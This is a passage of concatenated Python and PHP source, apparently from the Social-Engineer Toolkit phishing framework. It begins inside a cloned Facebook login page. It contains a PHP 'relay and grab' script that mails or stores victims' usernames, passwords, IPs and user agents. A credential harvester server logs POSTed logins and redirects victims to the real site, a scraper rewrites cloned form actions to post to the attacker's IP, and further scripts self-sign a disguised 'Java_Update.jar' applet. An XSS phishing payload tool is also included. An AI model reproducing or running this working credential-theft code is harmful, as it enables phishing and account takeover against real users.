accesskey="9" title="Review our terms and policies.">Terms</a></td><td class="_51m- hLeft plm _51mw"><a href="https://www.facebook.com/help/?ref=pf" accesskey="0" title="Visit our Help Center.">Help</a></td></tr></tbody></table></div><div class="mvl copyright"><div class="fsm fwn fcg"><span> Facebook 2013</span>  <a rel="dialog" href="/ajax/intl/language_dialog.php?uri=https%3A%2F%2Fwww.facebook.com%2Flogin.php" title="Use Facebook in another language." role="button">English (US)</a></div></div></div></div></div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       </body></html>
</div>
               
        <script src=\""""+pathList[3]+"""\"></script> 
        <script src=\""""+pathList[4]+"""\"></script>
        <script src=\""""+pathList[5]+"""\"></script>
        <script src=\""""+pathList[6]+"""\"></script>
        <script src=\""""+pathList[7]+"""\"></script>

</body>
</html>
<?PHP
// FullScreen Attack PHP Relay and Grab Code
// Written By: d4rk0
// Twitter: @d4rk0s


function writeFile($fileName,$data,$fileType){
    // This Opens file at end for writing if doesnt exist tries to create it
    $file = fopen($fileName, 'a');
    fwrite($file, $data);
    fclose($file);
  }


function sendM($to,$message){
        // To send HTML mail, the Content-type header must be set
        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        // Additional headers
        $headers .= 'From: SET Attack <fullscreen@phish.org>' . "\\r\\n";
        $subject = "Victims Information";
        // Mail it
        mail($to, $subject, $message, $headers);
 }

function pageForward($page){
        // Page Forward
        echo '<meta http-equiv="refresh" content="0;URL='.$page.'">';
 }

function randomFilename(){
     // return random file name
    mt_srand(time()%2147 * 1000000 + (double)microtime() * 1000000); 
    $randomNUM = mt_rand(1, 972484); 
    $fileNAME = "report" . $randomNUM. ".txt";
    return $fileNAME;
 }


function pullIP(){
    // This Returns an IP of person
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){   //to check ip is pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
 }

function userAgent(){
    $Agent = $_SERVER['HTTP_USER_AGENT'];
    return $Agent;
 }


if(isset($_POST['submit'])){

       $action  = \""""+valueList[0]+"""\";
       $redirect = \""""+valueList[1]+"""\";
       $verbose = \""""+valueList[2]+"""\";
       $fileName = \""""+valueList[3]+"""\";
       $to = \""""+valueList[3]+"""\";
       // Grab Form Values
       $email = $_POST[\"Username\"];
       $password =  $_POST[\"Password\"];
   
    // Specify rest of PHP code
       
    // Verbose loud
    if ($verbose == "loud"){
        $IP = pullIP();
        $Agent = userAgent();
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- Other Information: ".
        "\n Victim IP: " .$IP. " UserAgent: ".$Agent;
        }

   // Verbose quiet
   if ($verbose == "quiet"){
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- END OF TRANSCRIPT";
        }


    // Send in mail
    if ($action == "mail"){
       // Email Message 
        sendM($to,$message);
        pageForward($redirect);
    }
  

    // Save to ServerDisk as Same File
    if ($action == "diskFile"){
        // Write to Individual File 
        if ($fileName == ""){ $fileName = "SETInfo.txt";  }
        writeFile($fileName,$message);
        pageForward($redirect);
    }


    // Save to ServerDisk Random File
    if ($action == "diskRandom"){
        // Get random File name
        $fileName = randomFilename();          
        writeFile($fileName,$message);
        pageForward($redirect);
    }

 }

?>
            """
            # Append code to list
            indexList.append(indexCode)
            # Append Index List
            return indexList        

   ################################################################################
   ################################################################################

    def displayProperOSClear(self):
    # Clear The screen

        osName = self.determineOperatingSystem()

        if osName == "windows":
            # clear screen on windows		
            os.system('cls') 
        else:
	     # clear screen on linux/unix -- mac
            os.system('clear')




########NEW FILE########
__FILENAME__ = full
#!/usr/bin/env python

# FullScreen Attack SET Addon Module :: Example of Usage
# Author: d4rk0
# twitter: @d4rk0s

from fsattacks import *

def mainFullScreenAttackLoadExample():

    # Load And Start 
    x = fullScreenAttacks()
    # Checks config if set loads intro if not skips
    x.phishMenuMain()

    
#if __name__ == "__main__":
    # Run if executed

mainFullScreenAttackLoadExample()


########NEW FILE########
__FILENAME__ = harvester
#!/usr/bin/env python
import subprocess
import sys
import os
import re
import cgi
import BaseHTTPServer
import SimpleHTTPServer
import socket
from SocketServer import BaseServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
import threading
import datetime
import shutil

# get path to normal
definepath = os.getcwd()
sys.path.append(definepath)

from src.core.setcore import *

from config.set_config import APACHE_SERVER as apache_check
from config.set_config import WEBATTACK_EMAIL as webattack_email
from config.set_config import TRACK_EMAIL_ADDRESSES as track_email
from config.set_config import HARVESTER_LOG as logpath

if track_email == True:
    print_status("You have selected to track user accounts, Apache will automatically be turned on to handle tracking of users.")
    apache_check = True
# detect openssl module
try:
    from OpenSSL import SSL
# handle import error that openssl is not there
except ImportError:
    print "Python OpenSSL wasn't detected, note that SSL compatibility is now turned off"

############################################
#          Credential harvester            #
############################################

# define the current working directory
definepath=os.getcwd()
me = mod_name()

# append python to our current working directory
sys.path.append(definepath)

# import the base setcore libraries
from src.core.setcore import *

attack_vector=""
fileopen=file(setdir + "/attack_vector", "r")
for line in fileopen:
    line=line.rstrip()
    if line == 'multiattack':
        attack_vector='multiattack'

# if attack vector isnt the multiattack
if attack_vector != "multiattack":
    print bcolors.RED + """
The best way to use this attack is if username and password form
fields are available. Regardless, this captures all POSTs on a website.""" + bcolors.ENDC
# see if we're tabnabbing or multiattack

homepath=os.getcwd()

# pull scraper
try: reload(src.webattack.harvester.scraper)
except: import src.webattack.harvester.scraper


# GRAB DEFAULT PORT FOR WEB SERVER AND CHECK FOR COMMAND CENTER
command_center="off"
fileopen=file("config/set_config" , "r").readlines()
counter=0
for line in fileopen:
    line=line.rstrip()
    match=re.search("WEB_PORT=", line)
    if match:
        line=line.replace("WEB_PORT=", "")
        web_port=line
        counter=1
    match2=re.search("COMMAND_CENTER=ON", line)
    if match2:
        command_center="on"
        command_center_write=file(setdir + "/cc_harvester_hit" % (setdir),"w")

# if nada default port 80
if counter == 0: web_port=80

# pull URL field
counter=0
fileopen=file(setdir + "/site.template","r").readlines()
for line in fileopen:
    line=line.rstrip()
    match=re.search("URL=",line)
    if match:
        RAW_URL=line.replace("URL=", "")
        URL=line.replace("URL=http://", "")
        URL=line.replace("URL=https://", "")
        counter=1

# this checks the set_config to see if we need to redirect to a different website instead of the one cloned
harvester_redirect = check_config("HARVESTER_REDIRECT=")
if harvester_redirect.lower() == "on":
    URL = check_config("HARVESTER_URL=")
    counter = 1

if counter== 0: URL=''

# set ssl flag to false by default (counter basically)
ssl_flag="false"
self_signed="false"
# SEE IF WE WANT TO USE SSL
fileopen=file("config/set_config" , "r").readlines()
for line in fileopen:
    line=line.rstrip()
    match=re.search("WEBATTACK_SSL=ON", line)
    if match:
        # if we hit on ssl being on, set flag to true
        ssl_flag='true'

    # if flag is true begin prepping SSL stuff
    if ssl_flag=='true':
        # set another loop for find other variables we need for SSL setup
        for line in fileopen:
            # strip line feeds and carriage returns
            line=line.rstrip()
            # begin search for flags we need
            match=re.search("SELF_SIGNED_CERT=ON", line)
            # if we hit, lets create our own certificate
            if match:
                self_signed="true"
                # need to import our ssl module for creating a CA
                sys.path.append("src/core/ssl")
                # import our ssl module
                import setssl
                subprocess.Popen("cp %s/CA/*.pem %s" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                # remove old junk we dont need anymore
                subprocess.Popen("rm -rf %s/CA;cp *.pem %s" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

        # if user wants to specify his/her own PEM certificate
        if self_signed== "false":
            for line in fileopen:
                line=line.rstrip()
                # search for cert path
                match=re.search("PEM_CLIENT=", line, flags=re.IGNORECASE)
                if match:
                    pem_client=line.replace("PEM_CLIENT=","")
                    if not os.path.isfile(pem_client):
                        print "\nUnable to find PEM file, check location and config again."
                        exit_set()
                    if os.path.isfile(pem_client):
                        subprocess.Popen("cp %s %s/newcert.pem" % (pem_client,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                match2=re.search("PEM_SERVER=", line)
                if match2:
                    pem_server=line.replace("PEM_SERVER=","")
                    if not os.path.isfile(pem_server):
                        print "\nUnable to find PEM file, check location and config again."
                        exit_set()
                    if os.path.isfile(pem_server):
                        subprocess.Popen("cp %s %s/newreq.pem" % (pem_server,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

# url decode for postbacks
def htc(m):
    return chr(int(m.group(1),16))

# url decode
def urldecode(url):
    rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
    return rex.sub(htc,url)


# here is where we specify how many people actually visited versus fell for it
visits = file(setdir + "/visits.file", "a")
bites = file(setdir + "/bites.file", "a")

# SET Handler for handling POST requests and general setup through SSL
class SETHandler(BaseHTTPRequestHandler):
    def setup(self):
        # added a try except block in case of transmission errors
        try:

            self.connection = self.request
            self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
            self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

        # except errors and pass them
        except: pass

    # handle basic GET requests
    def do_GET(self):
    # import proper style css files here

        def handle_error(self, request, client_address):
            """Handle an error gracefully.  May be overridden.
               The default is to print a traceback and continue.
            """
            print '-'*40
            print 'Exception happened during processing of request from',
            print client_address
            import traceback
            traceback.print_exc() # XXX But this goes to stderr!
            print '-'*40
            pass


        counter = 0

        # try block setup to catch transmission errors
        try:

            if self.path == "/":
                self.send_response(200)
                self.send_header('Content_type', 'text/html')
                self.end_headers()
                fileopen=file(setdir + "/web_clone/index.html", "r")
                for line in fileopen:
                    self.wfile.write(line)
                # write out that we had a visit
                visits.write("hit\n")
                #visits.close()
                counter = 1

            # used for index2
            if self.path == "/index2.html":
                self.send_response(200)
                self.send_header('Content_type', 'text/html')
                self.end_headers()
                fileopen=file(setdir + "/web_clone/index2.html", "r")
                for line in fileopen:
                    self.wfile.write(line)
                # write out that we had a visit
                visits.write("hit\n")
                #visits.close()
                counter = 1

            else:
                if os.path.isfile(setdir + "/web_clone/%s" % (self.path)):
                    self.send_response(200)
                    self.end_headers()
                    fileopen=file(setdir + "/web_clone/%s" % (self.path), "rb")
                    for line in fileopen:
                        self.wfile.write(line)


            # if the file wasn't found
            if counter == 0:
                if os.path.isfile(setdir + "/web_clone/%s" % (self.path)):
                    fileopen=file(setdir + "/web_clone/%s" % (self.path), "rb")
                    for line in fileopen:
                        self.wfile.write(line)
                    fileopen.close()

        # handle errors, log them and pass through
        except Exception, e:
            # log to set
            log(e)
            # pass exceptions to keep going
            pass

    # handle POST requests
    def do_POST(self):
        length = int(self.headers.getheader('content-length'))
        qs = self.rfile.read(length)
        url=urldecode(qs)
        # specify we had a bite
        bites.write("hit\n")
        url=url.split("&")
        # change path to root for append on file
        os.chdir(homepath)
        # put the params into site.template for later user
        filewrite=file(setdir + "/site.template","a")
        filewrite.write("\n")
        filewrite2 = file("src/logs/harvester.log", "a")
        filewrite.write("\n\n")
        print bcolors.RED+"[*] WE GOT A HIT! Printing the output:\r" + bcolors.GREEN
        for line in url:
            counter=0
            line=line.rstrip()
            # if regular expression hit on user fields then do different
            match=re.search("Email|email|login|logon|Logon|Login|user|username|Username",line)
            if match:
                print bcolors.RED+"POSSIBLE USERNAME FIELD FOUND: "+line+"\r" + bcolors.GREEN
                counter=1
            match2=re.search("pwd|pass|uid|uname|Uname|userid|userID|USER|USERNAME|PIN|pin|password|Password|secret|Secret|Pass",line)
            if match2:
                # if you don't want to capture a password, turn this off, note not an exact science
                log_password = check_config("HARVESTER_LOG_PASSWORDS=")
                if log_password.lower() == "on":
                    print bcolors.RED+"POSSIBLE PASSWORD FIELD FOUND: "+line+"\r" + bcolors.GREEN
                else:
                    line = ""
                counter=1
            filewrite.write(cgi.escape("PARAM: "+line+"\n"))
            filewrite2.write(line+"\n")
            # if a counter hits at 0 then print this line
            if counter==0:
                print "PARAM: "+line+"\r"
            # reset counter
            counter=0

        filewrite.write("BREAKHERE")
        filewrite.close()
        filewrite2.close()

        if attack_vector != 'multiattack':
            print bcolors.RED+"[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.\r\n\r\n" + bcolors.ENDC

        # pull URL field
        counter=0
        fileopen=file(setdir + "/site.template","r").readlines()
        for line in fileopen:
            line=line.rstrip()
            match=re.search("URL=",line)
            if match:
                RAW_URL=line.replace("URL=", "")
                URL=line.replace("URL=http://", "")
                URL=line.replace("URL=https://", "")
                counter=1
            if counter== 0: URL=''

        # this checks the set_config to see if we need to redirect to a different website instead of the one cloned
        harvester_redirect = check_config("HARVESTER_REDIRECT=")
        if harvester_redirect.lower() == "on":
            RAW_URL = check_config("HARVESTER_URL=")
            counter = 1

        # when done posting send them back to the original site
        self.wfile.write('<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL))

        # set it back to our homepage
        os.chdir(setdir + "/web_clone/")

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""

def run():

    # check if we are not running apache mode
    if apache_check == False:
        try:

            server = ThreadedHTTPServer(('', int(web_port)), SETHandler)
            server.serve_forever()

        # handle keyboard interrupts
        except KeyboardInterrupt:
            os.chdir(homepath)
            try:
                visits.close()
                bites.close()

            except: pass
            if attack_vector != 'multiattack':
                try: reload(src.webattack.harvester.report_generator)
                except: import src.webattack.harvester.report_generator
            if attack_vector != 'multiattack':
                return_continue()
            os.chdir(homepath)
            httpd.socket.close()

        # handle the rest
        except Exception, e:
            print bcolors.RED + "[*] Looks like the web_server can't bind to 80. Are you running Apache?" + bcolors.ENDC
            apache_stop = raw_input("Do you want to attempt to disable Apache? [y/n]: ")
            apache_counter = 0
            if apache_stop == "yes" or apache_stop == "y" or apache_stop == "":
                if os.path.isfile("/etc/init.d/apache2"):
                    subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
                    apache_counter = 1
                if os.path.isfile("/etc/init.d/httpd"):
                    subprocess.Popen("/etc/init.d/httpd stop", shell=True).wait()
                    apache_counter = 1
            if apache_counter == 1:

                # check if we are running apache mode
                print_status("Successfully stopped Apache. Starting the credential harvester.")
                print_status("Harvester is ready, have victim browse to your site.")
                if apache_check == False:
                    try:

                        try:
                            server = ThreadedHTTPServer(('', int(web_port)), SETHandler)
                            server.serve_forever()

                        # handle keyboard interrupts
                        except KeyboardInterrupt:
                            os.chdir(homepath)
                        try:
                            visits.close()
                            bites.close()

                        except: pass
                        if attack_vector != 'multiattack':
                            sys.path.append("src/harvester")
                            import report_generator
                        if attack_vector != 'multiattack':
                            return_continue()
                        os.chdir(homepath)
                        httpd.socket.close()
                    except Exception:
                        apache_counter = 0

            if apache_counter == 0:
                print bcolors.GREEN + "[*] Try disabling Apache and try SET again." + bcolors.ENDC
                print "[*] Printing error: "+ str(e) + "\n"
                return_continue()
                exit_set()

    # if we are using apache, then use the harvester php type that writes it out to post.php
    # note just change the index.html to post somewhere else and rename the post.php to something else
    if apache_check == True:

        try:
            ipaddr=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ipaddr.connect(('127.0.0.1', int(web_port)))
            ipaddr.settimeout(2)
            if ipaddr: pass

        except Exception, e:
            if os.path.isfile("/etc/init.d/apache2"):
                apache_start = raw_input("[!] Apache may be not running, do you want SET to start the process? [y/n]: ")
                if apache_start == "y":
                    subprocess.Popen("/etc/init.d/apache2 start", shell=True).wait()

        try:

            apache_dir = check_config("APACHE_DIRECTORY=")
            print bcolors.GREEN + "Apache webserver is set to ON. Copying over PHP file to the website."
        except Exception, e:
                print e 
        print "Please note that all output from the harvester will be found under apache_dir/harvester_date.txt"
        print "Feel free to customize post.php in the %s directory" % (apache_dir) + bcolors.ENDC
        filewrite = file("%s/post.php" % (apache_dir), "w")
        now=datetime.datetime.today()
        filewrite.write("""<?php $file = 'harvester_%s.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?>""" % (now))
        filewrite.close()
        filewrite = file("%s/harvester_%s.txt" % (logpath,now), "w")
        filewrite.write("")
        filewrite.close()
        subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" % (logpath,now), shell=True).wait()

        # if we are using webjacking, etc.
        if os.path.isfile(setdir + "/web_clone/index2.html"):
            # need to copy the files over - remove the old one first if there
            if os.path.isfile(apache_dir + "/index2.html"):
                os.remove(apache_dir + "/index2.html")

            shutil.copyfile(setdir + "/web_clone/index2.html", apache_dir + "/index2.html")

        # here we specify if we are tracking users and such
        if track_email == True:
            fileopen = file (setdir + "/web_clone/index.html", "r")
            data = fileopen.read()
            data = data.replace("<body>", """<body><?php $file = 'harvester_%s.txt'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (now))
            filewrite = file(setdir + "/web_clone/index.2", "w")
            filewrite.write(data)
            filewrite.close()
            os.remove(setdir + "/web_clone/index.html")
            shutil.copyfile(setdir + "/web_clone/index.2", setdir + "/web_clone/index.html")
            # copy the entire web_clone directory.  
            # Without this only index.php|html are copied even though the user may have chosen to import the entire directory in the set module.
            copyfolder(setdir + "/web_clone", apache_dir)
        if os.path.isfile("%s/index.html" % (apache_dir)):
            os.remove("%s/index.html" % (apache_dir))
        if track_email == False:
            shutil.copyfile(setdir + "/web_clone/index.html", "%s/index.html" % (apache_dir))
        if track_email == True:
            shutil.copyfile(setdir + "/web_clone/index.html", "%s/index.php" % (apache_dir))
            print_status("NOTE: The URL to click on is index.php NOT index.html with track emails.")
        print_status("All files have been copied to %s" % (apache_dir))
        if attack_vector != 'multiattack':
            pause = raw_input("{Press return to continue}")

class SecureHTTPServer(HTTPServer):
    def __init__(self, server_address, HandlerClass):
        BaseServer.__init__(self, server_address, HandlerClass)
        # SSLv2 and SSLv3 supported
        ctx = SSL.Context(SSL.SSLv23_METHOD)
        # pem files defined before
        fpem_priv = 'newreq.pem'
        fpem_cli = 'newcert.pem'
        # establish private key
        ctx.use_privatekey_file (fpem_priv)
        # establish public/client certificate
        ctx.use_certificate_file(fpem_cli)
        # setup the ssl socket
        self.socket = SSL.Connection(ctx, socket.socket(self.address_family,self.socket_type))
        # bind to interface
        self.server_bind()
        # activate the interface
        self.server_activate()

    def shutdown_request(self,request): request.shutdown()


def ssl_server(HandlerClass = SETHandler,ServerClass = SecureHTTPServer):
        # bind to all interfaces on 443

    server_address = ('', 443) # (address, port)
    # setup the httpd server
    httpd = ServerClass(server_address, HandlerClass)
    # serve the httpd server until exit
    httpd.serve_forever()

if track_email == True: webattack_email = True
# if emailer webattack, spawn email questions
if webattack_email == True:
    try:
        import src.phishing.smtp.client.smtp_web
    except Exception, e:
        reload(src.phishing.smtp.client.smtp_web)

# see if we're tabnabbing or multiattack
fileopen=file(setdir + "/attack_vector", "r")
for line in fileopen:
    line=line.rstrip()
    if line == 'tabnabbing':
        print bcolors.RED+ "\n[*] Tabnabbing Attack Vector is Enabled...Victim needs to switch tabs."
    if line == 'webjacking':
        print bcolors.RED+ "\n[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link."

if ssl_flag == 'true':
    web_port="443"
    # check for PEM files here
    if not os.path.isfile(setdir + "/newreq.pem"):
        print "PEM files not detected. SSL will not work properly."
    if not os.path.isfile(setdir + "/newcert.pem"):
        print "PEM files not detected. SSL will not work properly."
    # copy over our PEM files
    subprocess.Popen("cp %s/*.pem %s/web_clone/" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
    # copy patched socket over to web clone
    definepath = os.getcwd()
    # we need to move a modified version of socket to handle SSL
    shutil.copyfile("%s/src/core/patched/socket.py" % (definepath) , "%s/socket.py" % (definepath)) 
   
# head over to cloned dir
if apache_check == False:
    os.chdir(setdir + "/web_clone/")

if attack_vector != "multiattack":
    if apache_check == False:
        print bcolors.BLUE+"[*] The Social-Engineer Toolkit Credential Harvester Attack\r\n[*] Credential Harvester is running on port "+web_port+"\r"        
        print "[*] Information will be displayed to you as it arrives below:\r" + bcolors.ENDC
    else:
        print bcolors.BLUE+"[*] Apache is set to ON - everything will be placed in your web root directory of apache."
        print bcolors.BLUE+"[*] Files will be written out to the root directory of apache."
        print bcolors.BLUE+"[*] ALL files are within your Apache directory since you specified it to ON."

# catch all
try:

    # if we are using ssl
    if ssl_flag == 'true':
        ssl_server()

    # if we aren't using ssl
    if ssl_flag == 'false':
        run()
except:
    # cleanup modified socket
    if ssl_flag == "true":
        if os.path.isfile(definepath + "/socket.py"):
            os.remove(definepath + "/socket.py")
        if os.path.isfile(definepath + "/socket.pyc"):
            os.remove(definepath + "/socket.pyc")
    pass

########NEW FILE########
__FILENAME__ = report_generator
#!/usr/bin/python

import re
import subprocess
import os
import datetime
from src.core.setcore import *

# make sure the reports directory is created
if not os.path.isdir(setdir + "/reports/"):
    os.makedirs(setdir + "/reports/")

#
# Quick report generation script
#

# Colors below
class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PINK = '\033[95m'
    ENDC = '\033[0m'

# End colors

# definepath
definepath = os.getcwd()

# grab URL and report information
now=datetime.datetime.today()
fileopen=file(setdir + "/site.template", "r")
site_template = file(setdir + "/site.template", "r").readlines()
fileopen1=file("%s/src/core/reports/index.html" % (definepath), "r")
for line in fileopen:
    match=re.search("URL=", line)
    if match:
        url=line.replace("URL=http://", "")
        url=line.replace("URL=https://", "")
        filewrite2=file(setdir + "/reports/%s.xml" % (now), "a")
        filewrite2.write(r"""<?xml version="1.0" encoding='UTF-8'?>""" + "\n")
        filewrite2.write(r"<harvester>" + "\n")
        for line2 in fileopen1:
            counter=0
            filewrite=file(setdir + "/reports/%s.html" % (now), "a")
            match1=re.search("REPLACEHEREDUDE", line2)
            if match1:
                line2=line2.replace("REPLACEHEREDUDE", url)
                filewrite.write(line2)
                url_xml=url.rstrip()
                filewrite2.write("   %s" % (url_xml) + "\n")
                counter=1
            match2=re.search("If this is blank, SET did not get a successful attempt on the website, sorry hoss..", line2)
            if match2:
                line2=line2.replace("If this is blank, SET did not get a successful attempt on the website, sorry hoss..", "Report findings on %s<br><br>" % (url))
                counter=1
                filewrite.write(line2)
                opentag = True
                for line3 in site_template:
                    match3=re.search("PARAM:", line3)
                    if match3:
                        xml=line3.replace("PARAM: ", "")
                        xml=xml.rstrip()
                        filewrite.write(line3+"<br>")
                        if opentag:
                            filewrite2.write(r"   <url>")
                            opentag = False
                        filewrite2.write(r"      <param>%s</param>" % (xml) + "\n")
                    match4=re.search("BREAKHERE", line3)
                    if match4:
                        filewrite2.write("   </url>" + "\n")
                        opentag = True
                        filewrite.write("<br>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br><br>")

            # look for how many people visited the website
            match5=re.search("VISITORSHERE", line2)
            if match5:
                if os.path.isfile(setdir + "/visits.file"):
                    fileopen3=file(setdir + "/visits.file", "r")
                    counter5=0
                    for line in fileopen3:
                        if line != "":
                            line=line.rstrip()
                            counter5 = counter5+1
                        if line == "": counter5 = 0
                if not os.path.isfile(setdir + "/visits.file"):
                    counter5 = 0

                line2=line2.replace("VISITORSHERE", str(counter5), 2)
                counter = 1
                #filewrite.write(line2)

            match6=re.search("BITESHERE", line2)
            if match6:
                if os.path.isfile(setdir + "/bites.file"):
                    fileopen4=file(setdir + "/bites.file", "r")
                    counter5 = 0
                    for line in fileopen4:
                        line=line.rstrip()
                        counter5 = counter5+1
                if not os.path.isfile(setdir + "/bites.file"):
                    counter5=0

                line2=line2.replace("BITESHERE", str(counter5))
                counter = 1
                filewrite.write(line2)

            if counter == 0:
                filewrite.write(line2)

try:
    filewrite.close()
    filewrite2.write(r"</harvester>" + "\n")
    filewrite2.close()
except: pass

subprocess.Popen("cp -rf %s/src/core/reports/files %s/reports/" % (definepath,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
print bcolors.BLUE + "[*] File exported to %s/reports/%s.html for your reading pleasure..."  % (setdir,now) + bcolors.ENDC
print bcolors.BLUE + "[*] File in XML format exported to %s/reports/%s.xml for your reading pleasure..." % (setdir,now) + bcolors.ENDC

########NEW FILE########
__FILENAME__ = scraper
#!/usr/bin/env python

import os
import sys
import re
import subprocess
import urlparse
import shutil
from src.core.setcore import *


#
# Scraper will grab the cloned website and try defining post parameters
#

# grab ipaddr
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = raw_input(setcore.setprompt("0", "IP address to connect back on: "))
    update_options("IPADDR=" + ipaddr)

# set the multiattack tabnabbing/webjacking flag
multi_tabnabbing="off"
multi_webjacking="off"
if os.path.isfile(setdir + "/multi_tabnabbing"):
    multi_tabnabbing="on"
if os.path.isfile(setdir + "/multi_webjacking"):
    multi_webjacking="on"

# see if we're tabnabbing
fileopen=file(setdir + "/attack_vector", "r")
for line in fileopen:
    line=line.rstrip()
    if line == 'tabnabbing' or multi_tabnabbing == "on" or line == 'webjacking' or multi_webjacking == "on":
        site='index2.html'
    else:
        site='index.html'

# set ssl flag to false by default
ssl_flag="false"
# SEE IF WE WANT TO USE SSL
ssl_check = check_config("WEBATTACK_SSL=").lower()
if ssl_check == "on": ssl_flag = "true"

# check apache mode
apache_mode = check_config("APACHE_SERVER=").lower()
# if we are turned on this will change to /post.php

track_user = check_config("TRACK_EMAIL_ADDRESSES=").lower()
if track_user == "on":
    apache_mode = "on"

apache_rewrite = ""
# if we are turned on, change this
if apache_mode == "on": apache_rewrite = "post.php"

# start the scraping process
fileopen=file(setdir + "/web_clone/%s" % (site),"r").readlines()
filewrite=file(setdir + "/web_clone/index.html.new","w")
for line in fileopen:

    # specify if it found post params
    counter=0
    # if we hit on a post method

    match=re.search('post',line, flags=re.IGNORECASE)
    method_post=re.search("method=post", line, flags=re.IGNORECASE)
    if match or method_post:

    # regex for now, can probably use htmlparser later, but right not what its doing is
    # replacing any url on the "action" field with your victim IP which will have a custom
    # web server running to post the data to your site
        if ssl_flag == 'false':
            line=re.sub('action="http?\w://[\w.\?=/&]*/', 'action="http://%s/' % (ipaddr), line)
            if apache_mode == "on":
                line = re.sub('action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
        if ssl_flag == 'true':
            line=re.sub('action="http?\w://[\w.\?=/&]*/', 'action="https://%s/' % (ipaddr), line)
            if apache_mode == "on":
                line = re.sub('action="*"', 'action="http://%s/post.php"' % (ipaddr), line)



    filewrite.write(line)


# close the file
filewrite.close()
# move our newly created website with our post stuff to our cloned area
if os.path.isfile(setdir + "/web_clone/index.html.new"):
    shutil.copyfile(setdir + "/web_clone/index.html.new", setdir + site)
    if os.path.isfile(setdir + "/web_clone/" + site):
        os.remove(setdir + "/web_clone/" + site)
    shutil.move(setdir + "/web_clone/index.html.new", setdir + "/web_clone/%s" % (site))


########NEW FILE########
__FILENAME__ = sign_jar
#!/usr/bin/python
#
# simple jar file
#
import subprocess
import os
try:
    print """
Simply enter in the required fields, easy example below:

Name: FakeCompany
Organization: Fake Company
Organization Name: Fake Company
City: Cleveland
State: Ohio
Country: US
Is this correct: yes

"""
    print """*** WARNING ***\nIN ORDER FOR THIS TO WORK YOU MUST INSTALL sun-java6-jdk or openjdk-6-jdk, so apt-get install openjdk-6-jdk\n*** WARNING ***"""
    # grab keystore to use later
    subprocess.Popen("keytool -genkey -alias signapplet2 -keystore mykeystore -keypass mykeypass -storepass mystorepass", shell=True).wait()
    # self-sign the applet
    subprocess.Popen("jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass -signedjar Signed_Update.jar Java_Obf.jar signapplet2", shell=True).wait()
    # move it into our html directory
    subprocess.Popen("rm ../../html/Signed_Update.jar.orig", shell=True).wait()
    subprocess.Popen("cp Signed_Update.jar ../../html/Signed_Update.jar.orig", shell=True).wait()
    subprocess.Popen("cp Java_Obf.jar ../../html/unsigned/unsigned.jar", shell=True).wait()
    print "[*] New java applet has been successfully imported into The Social-Engineer Toolkit (SET)"
except:
    pass

########NEW FILE########
__FILENAME__ = unsigned
#!/usr/bin/python
#
# simple jar file
#
import subprocess
import os
subprocess.Popen("rm Java_Update.jar", stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
subprocess.Popen("rm Java.class", stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
subprocess.Popen("javac Java.java", shell=True).wait()
subprocess.Popen("cp Java_Update.jar ../../html/unsigned/unsigned.jar", shell=True)
subprocess.Popen("jar cvf Java_Update.jar Java.class", shell=True).wait()
subprocess.Popen("jar ufm Java_Update.jar manifest.mf", shell=True).wait()
print "[*] Jar file exported as Java_Update.jar"

########NEW FILE########
__FILENAME__ = thebiz
#!/usr/bin/evn python

# XSS Phishing attack

# Written by Kyle Osborn
# kyle@kyleosborn.com
# GPLv2 License

# Logs data to an XML file. An XML parser will be created soon, or you can do it yourself.

# This is not an exploit tool, it's a payload tool.
# Once you've found the exloit, and you're able to inject javascript,
# just stick this in there as a script.
# <script src="http://YOURIP/">


# Proper HTTP Referers must be sent by the victim. If this is spoofed, or disabled, there will be odd results.

# Requirements - Everything below this line

import urllib2
import BeautifulSoup
import urlparse
import datetime
import re
import sys
from xml.dom import minidom
from xml.etree import ElementTree
from xml.etree.ElementTree import Element, SubElement
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
